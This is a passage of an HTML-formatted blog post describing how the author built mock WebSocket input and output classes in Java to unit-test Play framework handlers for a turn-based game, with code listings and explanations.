for the integration tests – start the server, connect two browsers to it, click
on the buttons to make a move and check the board updates. However, the tricky
bit was the implementation of unit tests for &lt;code&gt;WebSocket&lt;/code&gt; handlers.&lt;/p&gt;

&lt;h1 id="preliminaries"&gt;Preliminaries&lt;/h1&gt;

&lt;p&gt;A typical &lt;code&gt;WebSocket&lt;/code&gt; handler in Play has the following entry point for the
request dispatcher.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;join&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="nd"&gt;@Override&lt;/span&gt;
        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;onReady&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="c1"&gt;// ...&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When a request hits to &lt;code&gt;join()&lt;/code&gt;, the function returns a new &lt;code&gt;WebSocket&lt;/code&gt;
instance, where &lt;code&gt;onReady()&lt;/code&gt; will be invoked upon connection establishment. After
that, the book keeping of the input and output sockets are delegated to the
programmer. Note that the client-server communication is performed in JSON
messages in the above code snippet.&lt;/p&gt;

&lt;h1 id="mocking"&gt;Mocking&lt;/h1&gt;

&lt;p&gt;In order to mock a client-server &lt;code&gt;WebSocket&lt;/code&gt; communication, I need mock
&lt;code&gt;WebSocket.In&lt;/code&gt; and &lt;code&gt;WebSocket.Out&lt;/code&gt; class implementations. For that purpose, I
first tried googling alternatives and checked what other people have done
previously, but did not find much material. Hence, I came up with the following
&lt;code&gt;MockInputWebSocket&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="nd"&gt;@ThreadSafe&lt;/span&gt;
&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MockInputWebSocket&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;messageListeners&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
            &lt;span class="n"&gt;Collections&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;synchronizedList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;());&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;closeListeners&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
            &lt;span class="n"&gt;Collections&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;synchronizedList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;());&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;In&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;inputSocket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;In&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

        &lt;span class="nd"&gt;@Override&lt;/span&gt;
        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;onMessage&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;messageListeners&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="nd"&gt;@Override&lt;/span&gt;
        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;onClose&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback0&lt;/span&gt; &lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;closeListeners&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="o"&gt;};&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;messageListeners&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;close&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Callback0&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;closeListeners&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;In&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getInputSocket&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;inputSocket&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, I first implement a &lt;code&gt;WebSocket.In&lt;/code&gt; object, where message and close event
listeners can register themselves to &lt;code&gt;messageListeners&lt;/code&gt; and &lt;code&gt;closeListeners&lt;/code&gt;
list, respectively. Next, in order to pass data to the socket listeners, I wrote
my custom &lt;code&gt;write()&lt;/code&gt; and &lt;code&gt;close()&lt;/code&gt; methods.&lt;/p&gt;

&lt;p&gt;I also implemented &lt;code&gt;MockOutputWebSocket&lt;/code&gt; similarly:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="nd"&gt;@ThreadSafe&lt;/span&gt;
&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MockOutputWebSocket&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;ObjectMapper&lt;/span&gt; &lt;span class="n"&gt;objectMapper&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;ObjectMapper&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;BlockingQueue&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;messageQueue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;LinkedBlockingQueue&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Out&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;outputSocket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Out&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

        &lt;span class="nd"&gt;@Override&lt;/span&gt;
        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;messageQueue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="nd"&gt;@Override&lt;/span&gt;
        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;close&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;messageQueue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;objectMapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;readTree&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"{\"closed\": true}"&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="c1"&gt;// This should not happen.&lt;/span&gt;
            &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;RuntimeException&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;};&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;BlockingQueue&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getMessageQueue&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;messageQueue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Out&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getOutputSocket&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;outputSocket&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we would forget about the custom close message hack (nasty!) in &lt;code&gt;close()&lt;/code&gt;
method of the implemented &lt;code&gt;WebSocket.Out&lt;/code&gt; class, things are self-explanative
here as well. That is, when we receive a new message, we push it to
&lt;code&gt;messageQueue&lt;/code&gt;. The test user will be able to consume the messages written to
the mock output socket by polling &lt;code&gt;JsonData&lt;/code&gt; from the &lt;code&gt;messageQueue&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Since I come this far, I also implemented an entire &lt;code&gt;WebSocket&lt;/code&gt; mock
(&lt;code&gt;MockWebSocket&lt;/code&gt;) that employs the aforementioned &lt;code&gt;MockInputWebSocket&lt;/code&gt; and
&lt;code&gt;MockOutputWebSocket&lt;/code&gt; as follows.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="nd"&gt;@ThreadSafe&lt;/span&gt;
&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MockWebSocket&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;MockInputWebSocket&lt;/span&gt; &lt;span class="n"&gt;mockInput&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MockInputWebSocket&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;MockOutputWebSocket&lt;/span&gt; &lt;span class="n"&gt;mockOutput&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MockOutputWebSocket&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;MockWebSocket&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WebSocket&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;onReady&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mockInput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getInputSocket&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;mockOutput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getOutputSocket&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;JsonNode&lt;/span&gt; &lt;span class="nf"&gt;read&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;InterruptedException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;mockOutput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMessageQueue&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;poll&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TimeUnit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;SECONDS&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JsonNode&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;mockInput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;close&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;mockInput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;close&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;MockWebSocket&lt;/code&gt; provides the caller an interface such that the two-way
&lt;code&gt;WebSocket&lt;/code&gt; communication can be intercepted through provided &lt;code&gt;read()&lt;/code&gt;,
&lt;code&gt;write()&lt;/code&gt; and &lt;code&gt;close()&lt;/code&gt; methods – much like a regular network socket.&lt;/p&gt;

&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Remember that I used JSON as the messaging medium. For that purpose, I created a
couple of event classes (e.g., &lt;code&gt;WaitingForOpponent&lt;/code&gt;, &lt;code&gt;ReadyToStart&lt;/code&gt;,
&lt;code&gt;IllegalMove&lt;/code&gt;, etc.) and used &lt;a href="http://jackson.codehaus.org/"&gt;Jackson&lt;/a&gt; for
POJO-JSON (de)serialization. Next, I integrated my brand new &lt;code&gt;MockWebSocket&lt;/code&gt;
into the unit tests as follows.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;T&lt;/span&gt; &lt;span class="nf"&gt;readPojo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MockWebSocket&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;InterruptedException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JsonProcessingException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;JsonNode&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;read&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;assertThat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;isNotNull&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;objectMapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;convertValue&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IllegalArgumentException&lt;/span&gt; &lt;span class="n"&gt;iae&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;IllegalArgumentException&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
